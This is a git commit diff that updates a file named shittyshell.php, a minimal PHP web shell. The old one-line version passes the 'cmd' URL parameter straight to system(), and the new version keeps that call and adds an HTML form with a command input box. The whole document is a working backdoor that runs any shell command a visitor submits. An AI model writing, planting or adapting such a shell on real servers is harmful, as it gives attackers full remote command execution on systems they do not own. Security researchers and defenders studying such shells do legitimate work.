231f199d95c9211730fb80d24f1e616d29be16aa
Larry W. Cashdollar <larry0@me.com>
2018-11-01 22:40:45 -0400

    updated

--- shittyshell.php
+++ shittyshell.php
@@ -1,1 +1,10 @@
-<?php system($_GET['cmd']); ?>
+<?php 
+echo "<h2>Shitty Shell v1.0</h2>"; 
+echo "<hr><form><pre>";
+system($_GET['cmd']); 
+echo "</pre><hr>";
+echo "% <input text name='cmd' value='uptime'>";
+
+echo "</form>";
+
+?>
